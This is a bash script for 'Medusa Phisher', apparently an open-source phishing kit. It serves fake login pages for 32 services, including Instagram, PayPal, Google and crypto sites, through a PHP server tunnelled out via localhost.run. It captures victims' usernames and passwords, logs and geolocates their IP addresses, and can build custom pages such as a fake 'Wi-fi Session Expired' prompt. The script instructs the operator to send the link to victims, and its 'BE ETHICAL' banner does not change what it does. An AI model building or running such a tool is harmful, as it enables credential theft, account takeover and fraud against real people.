#!/bin/bash



# Define text colors

RED='\033[0;31m'

GREEN='\033[0;32m'

YELLOW='\033[0;33m'

NC='\033[0m' # No Color



# Function to clear the terminal

clear_terminal() {

    clear

}



big_welcome() {

    echo -e "${RED} __    __    ___  _        __   ___   ___ ___    ___      __ __   ____    __  __  _    ___  ____  ${NC}"

    echo -e "${RED}|  |__|  |  /  _]| |      /  ] /   \ |   |   |  /  _]    |  |  | /    |  /  ]|  |/ ]  /  _]|    \ ${NC}"

    echo -e "${RED}|  |  |  | /  [_ | |     /  / |     || _   _ | /  [_     |  |  ||  o  | /  / |  ' /  /  [_ |  D  )${NC}"

    echo -e "${RED}|  |  |  ||    _]| |___ /  /  |  O  ||  \_/  ||    _]    |  _  ||     |/  /  |    \ |    _]|    / ${NC}"

    echo -e "${RED}|  \`  ' ||   [_ |     /   \_ |     ||   |   ||   [_     |  |  ||  _  /   \_ |     ||   [_ |    \ ${NC}"

    echo -e "${RED} \      / |     ||     \     ||     ||   |   ||     |    |  |  ||  |  \     ||  .  ||     ||  .  \${NC}"

    echo -e "${RED}  \_/\_/  |_____||_____|\____| \___/ |___|___||_____|    |__|__||__|__|\____||__|\_||_____||__|\_${NC}"

    return

}







# Clear the terminal

clear_terminal



# Display the big welcome message

big_welcome



# Pause for 3 seconds

sleep 3







# Medusa Phisher

# Author: Adrilaw

# GitHub: github.com/Adrilaw











# Function to open author's GitHub page

open_page() {

    url="https://github.com/Adrilaw"

    open "$url"

}



# Function to get dependencies list

get_dependencies_list() {

    local dependencies=()



    # Extract dependencies mentioned in the script

    while IFS= read -r line; do

        # Check for commands and extract dependencies

        if [[ "$line" == *"xterm"* ]]; then

            dependencies+=("xterm")

        fi

        if [[ "$line" == *"php"* ]]; then

            dependencies+=("php")

        fi

        if [[ "$line" == *"ssh"* ]]; then

            dependencies+=("ssh")

        fi

    done < "$0" # Read from the current script file



    # Remove duplicates

    dependencies=($(echo "${dependencies[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))



    # Print the list of dependencies

    echo "${dependencies[@]}"

}



# Function to print a colored line

print_colored_line() {

    echo -e "\e[1;34m-------------------------------------------------------------------\e[0m"

}



# Call the function to get the dependencies list

dependencies_list=$(get_dependencies_list)



# Print the dependencies list with a colored line above

print_colored_line

echo -e "\e[1;33mDependencies list:\e[0m"

echo "$dependencies_list"

print_colored_line







start_server() {

    server=$1

    # Start the server

    echo "Start the server for: $server"

}





trap 'printf "\n"; stop; exit 1' 2



menu() {



#!/bin/bash



# ASCII art for "Medusa"

echo -e "\e[1;94m"

echo "                          __  __          _                   ____  _     _     _  "

echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "

echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "

echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  

echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  CODED BY: Adrilaw Github: https://github.com/Adrilaw"

echo -e "\e[1;33m"



# Print menu options

printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom    \e[0m\e[1;94m MEDUSA PHISHER  v1.2\e[0m\n"                                

printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay   \e[0m                 \n"

printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;91m Pinterest   \e[0m             \n"

printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;91m Twitter\e[0m        \e[1;92m[\e[0m\e[1;77m20\e[0m\e[1;92m]\e[0m\e[1;91m CryptoCurrency   \e[0m         \n"

printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m         \e[1;92m[\e[0m\e[1;77m21\e[0m\e[1;92m]\e[0m\e[1;91m Verizon   \e[0m                \n"

printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;91m Google\e[0m         \e[1;92m[\e[0m\e[1;77m22\e[0m\e[1;92m]\e[0m\e[1;91m DropBox   \e[0m               \n"

printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;91m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m23\e[0m\e[1;92m]\e[0m\e[1;91m Adobe ID   \e[0m               \n"

printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;91m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m24\e[0m\e[1;92m]\e[0m\e[1;91m Shopify   \e[0m               \n"

printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;91m PayPal\e[0m         \e[1;92m[\e[0m\e[1;77m25\e[0m\e[1;92m]\e[0m\e[1;91m Messenger   \e[0m            \n"

printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;91m Origin\e[0m         \e[1;92m[\e[0m\e[1;77m26\e[0m\e[1;92m]\e[0m\e[1;91m GitLab   \e[0m                 \n"

printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;91m Steam\e[0m          \e[1;92m[\e[0m\e[1;77m27\e[0m\e[1;92m]\e[0m\e[1;91m Twitch   \e[0m                \n"

printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;91m Yahoo\e[0m          \e[1;92m[\e[0m\e[1;77m28\e[0m\e[1;92m]\e[0m\e[1;91m MySpace   \e[0m               \n"

printf "\e[1;92m[\e[0m\e[1;77m13\e[0m\e[1;92m]\e[0m\e[1;91m Linkedin\e[0m       \e[1;92m[\e[0m\e[1;77m29\e[0m\e[1;92m]\e[0m\e[1;91m Badoo   \e[0m                 \n"

printf "\e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;91m Protonmail\e[0m     \e[1;92m[\e[0m\e[1;77m30\e[0m\e[1;92m]\e[0m\e[1;91m VK   \e[0m                     \n"

printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;91m Wordpress\e[0m      \e[1;92m[\e[0m\e[1;77m31\e[0m\e[1;92m]\e[0m\e[1;91m Yandex   \e[0m                 \n"

printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m32\e[0m\e[1;92m]\e[0m\e[1;91m devianART   \e[0m            \n"



# Add the coded by line

printf "                                                \e[1;94m CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/\e[0m\n"



read -p $'\n\e[1;92m➜ [\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option







if [[ $option == 1 ]]; then

server="instagram"

start



elif [[ $option == 2 ]]; then

server="facebook"

start

elif [[ $option == 3 ]]; then

server="snapchat"

start

elif [[ $option == 4 ]]; then

server="twitter"

start

elif [[ $option == 5 ]]; then

server="github"

start

elif [[ $option == 6 ]]; then

server="google"

start



elif [[ $option == 7 ]]; then

server="spotify"

start



elif [[ $option == 8 ]]; then

server="netflix"

start



elif [[ $option == 9 ]]; then

server="paypal"

start



elif [[ $option == 10 ]]; then

server="origin"

start



elif [[ $option == 11 ]]; then

server="steam"

start



elif [[ $option == 12 ]]; then

server="yahoo"

start



elif [[ $option == 13 ]]; then

server="linkedin"

start



elif [[ $option == 14 ]]; then

server="protonmail"

start



elif [[ $option == 15 ]]; then

server="wordpress"

start



elif [[ $option == 16 ]]; then

server="microsoft"

start



elif [[ $option == 17 ]]; then

server="instafollowers"

start



elif [[ $option == 18 ]]; then

server="shopping"

start



elif [[ $option == 19 ]]; then

server="pinterest"

start



elif [[ $option == 20 ]]; then

server="cryptocurrency"

start



elif [[ $option == 21 ]]; then

server="verizon"

start



elif [[ $option == 22 ]]; then

server="dropbox"

start



elif [[ $option == 23 ]]; then

server="adobe"

start



elif [[ $option == 24 ]]; then

server="shopify"

start



elif [[ $option == 25 ]]; then

server="messenger"

start



elif [[ $option == 26 ]]; then

server="gitlab"

start



elif [[ $option == 27 ]]; then

server="twitch"

start



elif [[ $option == 28 ]]; then

server="myspace"

start



elif [[ $option == 29 ]]; then

server="badoo"

start



elif [[ $option == 30 ]]; then

server="vk"

start



elif [[ $option == 31 ]]; then

server="yandex"

start



elif [[ $option == 32 ]]; then

server="devianart"

start



elif [[ $option == 33 ]]; then

server="create"

createpage

start



else

printf "\e[1;93m [!] Invalid option!\e[0m\n"

menu

fi

}



stop() {

    checklocalhostrun=$(ps aux | grep -o "localhost.run" | head -n1)

    checkphp=$(ps aux | grep -o "php" | head -n1)

    checknode=$(ps aux | grep -o "node" | head -n1)

    if [[ $checklocalhostrun == *'localhost.run'* ]]; then

        pkill -f -2 localhost.run > /dev/null 2>&1

        killall -2 localhost.run > /dev/null 2>&1

    fi

    if [[ $checkphp == *'php'* ]]; then

        pkill -f -2 php > /dev/null 2>&1

        killall -2 php > /dev/null 2>&1

    fi

    if [[ $checknode == *'node'* ]]; then

        pkill -f -2 node > /dev/null 2>&1

        killall -2 node > /dev/null 2>&1

    fi

}





banner() {

    printf "\n"

    printf "\e[1;93m#############################################\e[0m\n"

    printf "\e[1;93m#             BE ETHICAL                    #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#            :) :) :) :) :) :) :)           #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#     With great power comes great          #\e[0m\n"

    printf "\e[1;93m#          responsibility                   #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#             .--.                          #\e[0m\n"

    printf "\e[1;93m#            |o_o |                         #\e[0m\n"

    printf "\e[1;93m#            |:_/ |                         #\e[0m\n"

    printf "\e[1;93m#           //   \ \                        #\e[0m\n"

    printf "\e[1;93m#          (|     | )                       #\e[0m\n"

    printf "\e[1;93m#         /'\_   _/ \                       #\e[0m\n"

    printf "\e[1;93m#         \___)=(___/                       #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#  I'M NOT RESPONSIBLE FOR MISUSE OF SCRIPT #\e[0m\n"

    printf "\e[1;93m#                                           #\e[0m\n"

    printf "\e[1;93m#############################################\e[0m\n"

    printf "\n"

}



createpage() {

    default_cap1="Wi-fi Session Expired"

    default_cap2="Please login again."

    default_user_text="Username:"

    default_pass_text="Password:"

    default_sub_text="Log-In"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1

    cap1="${cap1:-${default_cap1}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2

    cap2="${cap2:-${default_cap2}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text

    user_text="${user_text:-${default_user_text}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text

    pass_text="${pass_text:-${default_pass_text}}"



    read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text

    sub_text="${sub_text:-${default_sub_text}}"



    echo "<!DOCTYPE html>" > sites/create/login.html

    echo "<html>" >> sites/create/login.html

    echo "<body bgcolor=\"gray\" text=\"white\">" >> sites/create/login.html

    IFS=$'\n'

    printf '<center><h2> %s <br><br> %s </h2></center><center>\n' $cap1 $cap2 >> sites/create/login.html

    IFS=$'\n'

    printf '<form method="POST" action="login.php"><label>%s </label>\n' $user_text >> sites/create/login.html

    IFS=$'\n'

    printf '<input type="text" name="username" length=64>\n' >> sites/create/login.html

    IFS=$'\n'

    printf '<br><label>%s: </label>' $pass_text >> sites/create/login.html

    IFS=$'\n'

    printf '<input type="password" name="password" length=64><br><br>\n' >> sites/create/login.html

    IFS=$'\n'

    printf '<input value="%s" type="submit"></form>\n' $sub_text >> sites/create/login.html

    printf '</center>' >> sites/create/login.html

    printf '<body>\n' >> sites/create/login.html

    printf '</html>\n' >> sites/create/login.html

}

catch_cred() {
    account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
    IFS=$'\n'
    password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
    
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" "$account"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" "$password"
    
    cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" "$server"

    # Message before killing processes
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Killing processes...\e[0m\n"

    # Kill PHP server and SSH session
    pkill -f 'php -S' # Adjust the command as necessary to match your PHP server
    pkill ssh         # This will kill all SSH sessions; be careful with this command

    exit 1
}

getcredentials() {
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {
touch sites/$server/saved.usernames.txt
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt


if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log

getcredentials
}


start() {

    printf "\n"

    printf "1. \e[1;94mLocalhost.run\e[0m\n"  # Adding color to "Localhost.run"

    echo ""

    read -p $'\n\e[1;92m┌──[ Choose the tunneling method: ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' host



    if [[ $host == 1 ]]; then

        # Ask user if they want to use the default port

        read -p $'\n\e[1;92m┌──[ Use default port 5555? (y/n) ]──┐\e[0m\n\e[1;92m│                                   │\e[0m\n\e[1;92m└─► ' use_default_port



        # Set the port based on user's input

        if [[ $use_default_port == "y" || $use_default_port == "Y" ]]; then

            port=5555

        else

            read -p $'\n\e[1;92m┌──[ Enter custom port: ]──┐\e[0m\n\e[1;92m│                            │\e[0m\n\e[1;92m└─► ' port

        fi



        xterm -e "bash -c 'printf \"Starting Localhost.run link...\n\"; ssh -R 80:localhost:$port nokey@localhost.run'" &

        sleep 2

        start_localhostrun $port

    fi

}



start_localhostrun() {

    local port=$1



    while true; do

        if [[ -e sites/$server/ip.txt ]]; then

            rm -rf sites/$server/ip.txt

         fi

        if [[ -e sites/$server/usernames.txt ]]; then

            rm -rf sites/$server/usernames.txt

        fi



        printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server on port $port...\n"

        cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &

        sleep 2



        printf "\e[1;92m[\e[0m*\e[1;92m] Please send the following link displayed in the xterm terminal to the victim it is output as: \e[0m\e[1;94mhttps://<link>.lhr.life\e[0m\n"



        # Waiting for victim to open link

        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for victim to open the link...\e[0m\n"



        # Continuously monitor ip.txt for changes

        while [ true ]; do

            if [[ -s "sites/$server/ip.txt" ]]; then

                printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"

                catch_ip

                printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for credentials...\e[0m\n"

                break # Exit the loop after displaying IP

            fi

            sleep 1

        done



        # Continuously monitor usernames.txt for changes

        while [ true ]; do

            if [[ -s "sites/$server/usernames.txt" ]]; then

                printf "\n\e[1;92m[\e[0m*\e[1;92m] Credentials Found!\n"

                catch_cred

                break # Exit the loop after finding credentials

            fi

            sleep 1

        done



        # Waiting for other victim to open link

        printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for other victim to open link...\e[0m\n"

    done

}

checkfound() {

    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"

    while [ true ]; do

        if [[ -e "sites/$server/ip.txt" ]]; then

            printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"

            catch_ip

        fi

        sleep 1

    done

}



# Main script starts here



# Remove unnecessary files

rm -rf index.html

rm -rf .gitignore

rm -rf .nojekyll



# Display banner and start the menu

banner

menu
